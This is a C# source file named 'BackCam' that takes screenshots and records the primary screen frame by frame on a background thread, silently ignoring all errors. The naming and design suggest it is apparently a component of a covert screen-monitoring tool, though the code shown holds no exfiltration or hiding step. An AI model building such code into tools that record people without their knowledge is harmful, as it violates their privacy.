using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;

namespace BackCam
{
    static class Cam
    {
        public static Bitmap TakeScreenShot()
        {
            try
            {
                Rectangle screenSize = Screen.PrimaryScreen.Bounds;
                Bitmap image = new Bitmap(screenSize.Width, screenSize.Height);

                using (Graphics g = Graphics.FromImage(image))
                {
                    g.CopyFromScreen(0, 0, 0, 0, new Size(screenSize.Width, screenSize.Height));
                }

                return image;
            }
            catch
            {
                return new Bitmap(0, 0);
            }
        }

        public static int TakeVideo()
        {
            try
            {
                Thread recorder = new Thread(new ThreadStart(Record));
                recorder.Start();
                return 1;
            }
            
            catch
            {
                return 0;
            }
        }

        static void Record()
        {
            try
            {
                Rectangle screenSize = Screen.PrimaryScreen.Bounds;
                Bitmap image = new Bitmap(screenSize.Width, screenSize.Height);

                int count = 0;

                while (Consts.canRecord)
                {
                    using (Graphics g = Graphics.FromImage(image))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, new Size(screenSize.Width, screenSize.Height));
                    }

                    Saver.SaveVideo(image, count);
                    count++;
                }
            }
            catch
            {
            }
        }
    }
}
